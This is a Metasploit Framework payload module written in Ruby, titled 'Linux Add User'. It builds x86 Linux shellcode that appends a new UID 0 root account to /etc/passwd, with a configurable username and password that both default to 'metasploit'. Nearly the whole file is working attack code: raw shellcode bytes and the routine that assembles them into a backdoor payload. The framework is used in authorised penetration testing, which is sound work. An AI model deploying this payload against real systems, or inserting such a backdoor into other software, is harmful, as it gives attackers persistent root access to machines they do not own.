##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


###
#
# AddUser
# -------
#
# Adds a UID 0 user to /etc/passwd.
#
###
module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Add User',
      'Description'   => 'Create a new user with UID 0',
      'Author'        => [ 'skape', 'vlad902', 'spoonm' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Privileged'    => true))

    # Register adduser options
    register_options(
      [
        OptString.new('USER',  [ true,  "The username to create",     "metasploit" ]),
        OptString.new('PASS',  [ true,  "The password for this user", "metasploit" ]),
        OptString.new('SHELL', [ false, "The shell for this user",    "/bin/sh"    ]),
      ], self.class)
  end

  #
  # Dynamically builds the adduser payload based on the user's options.
  #
  def generate_stage
    user    = datastore['USER']  || 'metasploit'
    pass    = datastore['PASS']  || 'metasploit'
    shell   = datastore['SHELL'] || '/bin/sh'
    str     = "#{user}:#{pass.crypt('Az')}:0:0::/:#{shell}\n"
    payload =
      "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58" +
      "\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70" +
      "\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd" +
      "\x80\x93" + Rex::Arch::X86.call(str.length) + str +
      "\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58" +
      "\xcd\x80"
  end

end
